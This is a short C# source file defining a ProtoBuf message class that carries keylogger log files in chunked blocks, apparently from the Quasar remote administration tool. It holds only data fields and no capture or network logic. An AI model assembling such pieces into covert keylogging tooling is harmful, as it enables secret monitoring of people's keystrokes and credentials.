using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsResponse : IMessage
    {
        [ProtoMember(1)]
        public string Filename { get; set; }

        [ProtoMember(2)]
        public byte[] Block { get; set; }

        [ProtoMember(3)]
        public int MaxBlocks { get; set; }

        [ProtoMember(4)]
        public int CurrentBlock { get; set; }

        [ProtoMember(5)]
        public string CustomMessage { get; set; }

        [ProtoMember(6)]
        public int Index { get; set; }

        [ProtoMember(7)]
        public int FileCount { get; set; }
    }
}
